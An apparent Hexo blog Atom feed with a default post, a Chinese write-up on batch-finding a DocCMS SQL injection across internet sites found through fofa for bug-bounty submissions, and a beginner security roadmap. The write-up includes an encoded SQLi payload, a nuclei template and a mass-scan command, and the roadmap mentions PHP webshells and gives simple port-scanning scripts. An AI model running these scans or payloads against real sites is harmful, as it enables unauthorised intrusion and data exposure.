<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>icekylin7 Blog</title>
  
  
  <link href="http://icekylin.github.io/atom.xml" rel="self"/>
  
  <link href="http://icekylin.github.io/"/>
  <updated>2022-11-15T09:13:09.256Z</updated>
  <id>http://icekylin.github.io/</id>
  
  <author>
    <name>icekylin7</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello World</title>
    <link href="http://icekylin.github.io/posts/16107/"/>
    <id>http://icekylin.github.io/posts/16107/</id>
    <published>2022-11-15T02:35:47.358Z</published>
    <updated>2022-11-15T09:13:09.256Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>记一次公益SRC上分思路</title>
    <link href="http://icekylin.github.io/posts/38206/"/>
    <id>http://icekylin.github.io/posts/38206/</id>
    <published>2022-09-14T16:00:00.000Z</published>
    <updated>2022-11-15T14:15:05.146Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>维护网络安全，营造良好的网络环境，文章仅供参考学习，请勿使用文中技术于非法用途，使用者造成任何负面影响与本人无关。</p></blockquote><h2 id="0x01-提前准备工作"><a href="#0x01-提前准备工作" class="headerlink" title="0x01 提前准备工作"></a>0x01 提前准备工作</h2><p>这里暂时排除使用GooleHack的语法，而是使用测绘站搜索CMS,缩小范围提高准确率。</p><p>需要使用到以下工具和文库</p><ul><li>佩奇文库: <a href="http://wiki.peiqi.tech/">http://wiki.peiqi.tech/</a></li><li>fofa: <a href="https://fofa.info/">https://fofa.info/</a></li><li>fofa_viewer: <a href="https://github.com/wgpsec/fofa_viewer">https://github.com/wgpsec/fofa_viewer</a></li><li>nuclei: <a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></li><li>批量查询权重: <a href="http://seo.iis7.com/">http://seo.iis7.com/</a></li><li>批量备案查询: <a href="http://www.jucha.com/beian/">http://www.jucha.com/beian/</a></li></ul><h2 id="0x02-使用POC测试单个站点"><a href="#0x02-使用POC测试单个站点" class="headerlink" title="0x02 使用POC测试单个站点"></a>0x02 使用POC测试单个站点</h2><h3 id="1-寻找可利用POC"><a href="#1-寻找可利用POC" class="headerlink" title="1. 寻找可利用POC"></a>1. 寻找可利用POC</h3><p>使用佩奇文库：<a href="http://wiki.peiqi.tech/wiki/cms/">http://wiki.peiqi.tech/wiki/cms/</a> 文库内部分漏洞存在可用POC，可提供我们测试学习，感谢大佬。</p><p><img src="/../assets/img/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E4%B8%8A%E5%88%86%E6%80%9D%E8%B7%AF/image-20221115171557337.png" alt="image-20221115171557337"></p><p>主要针对 CMS 框架漏洞，框架漏洞有着清晰的指纹标识，方便批量寻找到目标。</p><h3 id="2-使用空间测绘站寻找资产"><a href="#2-使用空间测绘站寻找资产" class="headerlink" title="2. 使用空间测绘站寻找资产"></a>2. 使用空间测绘站寻找资产</h3><p>并不是所有漏洞都有现成的POC，又因为CMS对应的资产并不少，要找到一个可以利用的POC不一定是一件简单的事情。推荐找 <strong>可以通过GET传参得到返回结果的SQL注入</strong> ，毕竟点进URL只要粘贴就可以验证是否存在漏洞。</p><p>在文库内找到网络测绘搜索语句，使用 fofa、shodan、360quake 等测绘引擎搜索相关资产。</p><h3 id="3-试相关资产漏洞是否存在"><a href="#3-试相关资产漏洞是否存在" class="headerlink" title="3. 试相关资产漏洞是否存在"></a>3. 试相关资产漏洞是否存在</h3><p>带有破坏型的漏洞不推荐测试，仅测试回显结果可以证明存在漏洞的POC。注入只需要爆出数据库、任意文件上传只需要上传phpinfo而不是传个shell，目前我是这么理解。</p><p>这里选择的是一个普通的 SQL 注入，构建poc如下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:example.com/search/index.php?keywordspan><br></pre></td></tr></table></figure><p>当页面发挥结果中包含 数据库用户名称、数据库地址则代表存在漏洞，至此为止。以下为图片说明</p><p><img src="/../assets/img/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E4%B8%8A%E5%88%86%E6%80%9D%E8%B7%AF/image-20221115171630787.png" alt="image-20221115171630787"></p><h2 id="0x03-批量对站点进行检测"><a href="#0x03-批量对站点进行检测" class="headerlink" title="0x03 批量对站点进行检测"></a>0x03 批量对站点进行检测</h2><h3 id="1-将收集结果URL保存至本地"><a href="#1-将收集结果URL保存至本地" class="headerlink" title="1. 将收集结果URL保存至本地"></a>1. 将收集结果URL保存至本地</h3><p>可以通过测绘站接口，或是工具简单的实现，如 <a href="https://github.com/wgpsec/fofa_viewer">fofa_viewer</a></p><p><img src="/../assets/img/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E4%B8%8A%E5%88%86%E6%80%9D%E8%B7%AF/image-20221115171636565.png" alt="image-20221115171636565"></p><p>将HOST字段保存至本地txt文件，此时你就得到了一个可能存在漏洞的站点列表。</p><p><img src="/../assets/img/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E4%B8%8A%E5%88%86%E6%80%9D%E8%B7%AF/image-20221115171640822.png" alt="image-20221115171640822"></p><h3 id="2-编写POC或使用工具批量检测"><a href="#2-编写POC或使用工具批量检测" class="headerlink" title="2. 编写POC或使用工具批量检测"></a>2. 编写POC或使用工具批量检测</h3><p>这里稍微的犹豫了一下，要是用python requests写，那我要用到其他POC的时候，岂不是改起来很麻烦，之前了解过 <a href="https://github.com/projectdiscovery/nuclei/blob/master/README_CN.md">https://github.com/projectdiscovery/nuclei/blob/master/README_CN.md</a> 或许可以通过这个实现？</p><p>研究了一下，需要达成需求：向<code>https://example.com/search/index.php</code>发送指定 GET 请求，返回响应包内包含 <code>ORDER BY id DESC</code>字段的 URL，GET请求参数如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=<span class="number">1</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">33</span></span><br></pre></td></tr></table></figure><p>很简单，参考官方文档 <a href="https://nuclei.projectdiscovery.io/templating-guide/protocols/http/">https://nuclei.projectdiscovery.io/templating-guide/protocols/http/</a> “基础的HTTP请求” 编写一个 yaml 配置文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 必要字段 ID</span></span><br><span class="line"><span class="attr">id:</span> <span class="string">DocCMS-keyword-SQLi</span></span><br><span class="line"><span class="comment"># 必要字段INFO</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">DocCMS-keyword-SQLi</span></span><br><span class="line">    <span class="attr">author:</span> <span class="string">kylin</span></span><br><span class="line">    <span class="attr">tags:</span> <span class="string">sqli,DocCMS</span></span><br><span class="line">    <span class="attr">reference:</span> <span class="string">http://wiki.peiqi.tech/wiki/cms/DocCMS/DocCMS%20keyword%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html</span></span><br><span class="line">    <span class="attr">severity:</span> <span class="string">high</span></span><br><span class="line"><span class="comment"># HTTP请求数据包</span></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="comment"># 原始数据包(RAW)内容</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">raw:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line"><span class="string">      GET /search/index.php?keywordspan></span><br><span class="line"><span class="string">      Host: &#123;&#123;Hostname&#125;&#125;</span></span><br><span class="line"><span class="string"></span>    <span class="comment"># 匹配字符串包含 ORDER BY id DESC</span></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">word</span></span><br><span class="line">        <span class="attr">words:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&quot;ORDER BY id DESC&quot;</span></span><br></pre></td></tr></table></figure><p>再看一下官方文档 <a href="https://github.com/projectdiscovery/nuclei/blob/master/README_CN.md">https://github.com/projectdiscovery/nuclei/blob/master/README_CN.md</a> 使用参数调用模板文件获取扫描结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.调用 DocCMS-keyword-SQLi.yaml 模板，扫描 urls.txt 文件</span></span><br><span class="line"><span class="comment"># 2.将结果保存至 result_DocCMS-keyword-SQLi.txt</span></span><br><span class="line"><span class="comment"># 3.简化输出结果 重试次数10 超时时间30s</span></span><br><span class="line">nuclei -l urls.txt -t DocCMS-keyword-SQLi.yaml -o result_DocCMS-keyword-SQLi.txt -nm -retries 10 -<span class="built_in">timeout</span> 30</span><br></pre></td></tr></table></figure><p><img src="/../assets/img/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E4%B8%8A%E5%88%86%E6%80%9D%E8%B7%AF/image-20221115171647853.png" alt="image-20221115171647853"></p><p>然后哇的一下，扫描结果就全出来了</p><p>使用 nuclei 编写 yaml 对批量检测漏洞有很大的帮助，不过根据官方的定义 nuclei 还可以用作渗透测试的工作流，这里留个个小小的坑</p><h2 id="0x04-快速定位资产提交报告"><a href="#0x04-快速定位资产提交报告" class="headerlink" title="0x04 快速定位资产提交报告"></a>0x04 快速定位资产提交报告</h2><h3 id="1-正则筛选根域名"><a href="#1-正则筛选根域名" class="headerlink" title="1. 正则筛选根域名"></a>1. 正则筛选根域名</h3><p>因为扫描结果的URL并不是网站根域名，先简单针对扫描结果用正则匹配一下根域。）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># awk 正则定位根域名</span></span><br><span class="line">awk -F <span class="string">&#x27;search&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> result_DocCMS-keyword-SQLi.txt &gt; domain_DocCMS-keyword-SQLi.txt</span><br></pre></td></tr></table></figure><h3 id="2-批量查询站点权重"><a href="#2-批量查询站点权重" class="headerlink" title="2. 批量查询站点权重"></a>2. 批量查询站点权重</h3><p>批量查询权重：<a href="http://seo.iis7.com/">http://seo.iis7.com/</a></p><p>确认提交的平台, 漏洞盒子提交无限制, 补天需要百度权重&gt;&#x3D;1或Google权重&gt;&#x3D;3</p><p>更多关于补天的注意事项可以参考这篇文章: <a href="https://blog.csdn.net/qq_37113223/article/details/111916474">关于补天SRC小白入门详细介绍</a> </p><p>针对爱站PC、爱站PE、GooglePR筛选查询结果</p><p><img src="/../assets/img/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E4%B8%8A%E5%88%86%E6%80%9D%E8%B7%AF/image-20221115171652516.png" alt="image-20221115171652516"></p><h3 id="3-批量查询备案信息"><a href="#3-批量查询备案信息" class="headerlink" title="3. 批量查询备案信息"></a>3. 批量查询备案信息</h3><p>提交漏洞报告时，需要对公司名称以及公司定位做选择，这里有三个选择</p><ul><li><a href="http://www.jucha.com/beian/">批量备案查询</a> 免费额度用完了需要付费，免费额度500条</li><li><a href="https://icp.chinaz.com/">站长ICP备案查询</a> 不能批量查询，单个提交报告时也够用</li></ul><p>对于 <strong>批量查询站点权重</strong>、<strong>批量查询备案信息</strong> 本来都是有想法写个脚本来实现的，奈何这些0权站点实在不能给人带来动力.</p><p>提交漏洞的事情就交给另一个小倒霉蛋吧。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;维护网络安全，营造良好的网络环境，文章仅供参考学习，请勿使用文中技术于非法用途，使用者造成任何负面影响与本人无关。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x01-提前准备工作&quot;&gt;&lt;a href=&quot;#0x01-提前准备工作&quot; clas</summary>
      
    
    
    
    <category term="网络安全" scheme="http://icekylin.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="半自动化漏洞挖掘" scheme="http://icekylin.github.io/tags/%E5%8D%8A%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>关于安全的一些学习经历</title>
    <link href="http://icekylin.github.io/posts/40921/"/>
    <id>http://icekylin.github.io/posts/40921/</id>
    <published>2022-09-09T16:00:00.000Z</published>
    <updated>2022-11-15T12:32:49.364Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>注意：此文不适合进阶学习，仅适合入门<br>很久以前学习过的一些网络安全相关知识，列出了一些知识点、大致的规划；方便快速上手]</p></blockquote><p>笔记不是刚需，但是当你第二次遇到同样简单的问题的时候，你还需要通过搜索引擎去查询，那不妨把简单的内容记录在笔记内，以供随时查阅参考。<br>因为是快速入门阶段，为快速了解体系，不会过多的深入原理。</p><h3 id="Stage-0-前置技能"><a href="#Stage-0-前置技能" class="headerlink" title="Stage 0 - 前置技能"></a>Stage 0 - 前置技能</h3><p>“一个不会编程的运维不是一个好的黑客”<br>学习安全需要搭建靶场、编写脚本、读懂代码，在正式学习之前，至少需要掌握以下几种能力</p><ul><li>虚拟机软件的使用（如 VMware、VirtualBox 等）</li><li>Linux操作系统基础（文件操作、目录切换、磁盘挂载、权限管理等）</li><li>简单服务的搭建（Apache&#x2F;Nginx、MySQL、PHP）</li></ul><p>对于虚拟机软件 Windows 下主要推荐使用 <strong>VMware Workstation</strong>，界面简单容易上手。服务的搭建可以使用集成软件如：<strong>Phpstudy</strong>、<strong>wampserver</strong> 等软件，只需要能正常访问即可。Linux 操作系统建议长期使用，熟悉在命令行对文件进行增删查改的操作。在掌握 Linux 基本命令之后对服务搭建的技能进行拓展，在 Linux 上搭建一个完整 Web Server 服务，通常是使用的是 <strong>Apache + MySQL + PHP</strong>，简称也就是 LAMP（Linux Apache MySQL PHP）。<br>关键词：<code>#Linux搭建LAMP``#VMware安装Linux</code> <code>#phpstudy搭建网站</code></p><h3 id="Stage-1-靶场学习"><a href="#Stage-1-靶场学习" class="headerlink" title="Stage 1 - 靶场学习"></a>Stage 1 - 靶场学习</h3><p>在掌握了基本服务的搭建技能后，可以通过搭建靶场来进行综合能力的学习，常见的靶场如 DVWA、Pikachu 都是不错的综合渗透测试靶场，这里以 <strong>DVWA</strong> 为例，可以通过 Phpstudy 或者 Linux 搭建 DVWA 靶场环境，在靶场内，需要学习的技能有如下</p><ul><li>Brute Force 暴力破解 <ul><li>使用 BurpSuite 利用字典进行暴力破解</li></ul></li><li>Command Injection 命令注入 <ul><li>需要掌握 Linux、Windows 操作系统下命令行的连接符使用</li></ul></li><li>CSRF<ul><li>#TODO</li></ul></li><li>File Inclusion 文件包含 <ul><li>需要对 PHP 读取文件的函数进行学习</li></ul></li><li>File Upload 文件上传 <ul><li>需要学习如何编写一个简单的后门程序，关键词为 一句话木马，针对 PHP 搭建的服务也就是 PHP一句话木马，需要使用 蚁剑、冰蝎等工具进行连接。这里推荐使用 <a href="https://github.com/AntSwordProject/antSword">蚁剑</a></li></ul></li><li>SQL Injection SQL注入 <ul><li>需要学习 SQL 基本语句，包括注释以及查询。</li></ul></li><li>XSS <ul><li>需要学习 JavaScript，如何利用 <code>&lt;script&gt;</code> 标签弹出提示框以及 Cookie</li></ul></li></ul><p>有关于靶场的学习内容，合理的利用搜索引可以轻松的获取到答案，针对 DVWA 的安全等级机制，不需要对 Medium、High、Impossible 的利用方式了然于心，但对于 Low 等级的利用方式，需要做到可以脱离任何资料而去利用。<br>关键词：<code>#phpstudy搭建DVWA``#DVWA WriteUp</code> <code>#DVWA 通关教程</code></p><h3 id="Stage-2-靶机渗透"><a href="#Stage-2-靶机渗透" class="headerlink" title="Stage 2 - 靶机渗透"></a>Stage 2 - 靶机渗透</h3><p>靶机渗透测试可以帮助你速成脚本小子，也可以让你初步了解渗透测试的基本流程，在这过程中可能会使用大量的工具辅助，以下为 DC:1 靶机作为参考的学习途径<br>下载地址：<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p><ol><li>VMware 或 VirtualBox 搭建靶机</li><li>网络环境正常后进行局域网存活扫描（常用的工具有 fping、arping、nmap）<ul><li><code>fping -aqg [网段/子网掩码]</code></li></ul></li><li>对靶机端口信息进行扫描 <ul><li><code>nmap -sV [Target_IP]</code></li></ul></li><li>针对 Web 服务使用 msfconsole 可利用模块 <ol><li>任意文件上传，使用蚁剑连接一句话木马</li><li>缓冲区溢出，获取目标系统 Shell</li></ol></li><li>利用 SUID 文件提升权限</li></ol><p>对靶机的渗透测试互联网上同样有大部分的参考实例，关键词为 <strong>靶机名称+WriteUp</strong> 或 <strong>靶机名称+Walkthrough</strong>，有过一次完整的打靶经验那我们就快速进入下一个阶段吧，不要过度迷恋这个感觉，毕竟靶机是打不完的。<br>工具的安装和使用并不会一帆风顺，有时需要查阅大部分的资料，对于不同环境的搭建又各有不同，可以使用集成的渗透测试系统如：Kali、Parrot等，这里推荐 <a href="https://www.kali.org/">Kali</a><br>关键词：<code>#DC-1 WriteUp``#VMware搭建DC-1``#VirtualBox搭建DC-1</code></p><h3 id="Stage-3-编程能力"><a href="#Stage-3-编程能力" class="headerlink" title="Stage 3 - 编程能力"></a>Stage 3 - 编程能力</h3><p>在愉快的脚本小子生活结束后，不要忘了巩固你的编程能力，有几门常用的语言适合作为渗透测试的辅助语言如 Python，Shell，下面推荐几个简单的脚本快速理解<br>Shell 局域网存活扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for i in &#123;1..254&#125;</span><br><span class="line">  do</span><br><span class="line">      (if ping -c 1 -W 1 10.110.2.$i &amp;&gt; /dev/null;then # 替换IP段为自身所处的IP段</span><br><span class="line">          echo &quot;10.110.2.$i is up&quot;</span><br><span class="line">      fi)&amp;</span><br><span class="line">  done</span><br><span class="line">wait</span><br></pre></td></tr></table></figure><p>Python 获取目标banner</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&quot;198.46.152.109&quot;</span>,<span class="number">22</span>)) <span class="comment"># 198.46.152.109 是我的 vps 地址，22对应的服务是 SSH</span></span><br><span class="line">banner = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(banner)</span><br></pre></td></tr></table></figure><p>Python 端口扫描</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">        s.connect((<span class="string">&quot;198.46.152.109&quot;</span>,port)) </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Port:%d Open&#x27;</span> % port)</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] Port:%d Close&#x27;</span> % port)</span><br></pre></td></tr></table></figure><p>编程语言的学习入门通常需要掌握数据结构，循环，错误处理。对于 Python 还需要掌握一些模块，如上面使用到的 socket、requets 等。除此之外还有一些可能会用到的语言如 Go、Java、C，因为 Python 是一门很适合编写工具的脚本语言，所以暂时不对其他语言做深入了解（当然如果你有其他方面的能力也可以直接运用在网络编程的领域）</p><h3 id="Stage-4-综合能力"><a href="#Stage-4-综合能力" class="headerlink" title="Stage 4 - 综合能力"></a>Stage 4 - 综合能力</h3><p>在掌握基本能力以后你已经可以编写简单的脚本程序来临时代替 fping、nmap 等工具来辅助你进行渗透测试（当然这并不是刚需），一入网安深似海，我的路线并不一定是最完美的，但既然我都可以总结出来，相信你也可以在此基础上更加精进来达到更高的境界。说是综合能力，其实在这时已经可以查漏补缺，弥补之前欠缺的知识，如完善理解 SQL注入的原理，通过 SQLi-Labs 等靶场进一步学习 SQL 注入，或是通过 Upload-Labs 靶场进一步学习绕过文件上传限制的方式，从这里开始学习就变得更加需要深度和广度，不妨根据前辈们的技能树，选择必备的技能以及感兴趣的方向，继续深度的学习，这里放几个我收集到的技能树，或许能给你之后的安全学习带来一点帮助</p><ul><li><a href="https://www.hackjie.com/1500.html">黑客街 web渗透学习路线图</a></li><li><a href="https://evilcos.me/security_skill_tree_basic/index.html">余弦的安全技能树简版</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;注意：此文不适合进阶学习，仅适合入门&lt;br&gt;很久以前学习过的一些网络安全相关知识，列出了一些知识点、大致的规划；方便快速上手]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;笔记不是刚需，但是当你第二次遇到同样简单的问题的时候，你还需要通过搜索引擎去查</summary>
      
    
    
    
    <category term="网络安全" scheme="http://icekylin.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="编程开发" scheme="http://icekylin.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="学习经历" scheme="http://icekylin.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%BB%8F%E5%8E%86/"/>
    
  </entry>
  
</feed>
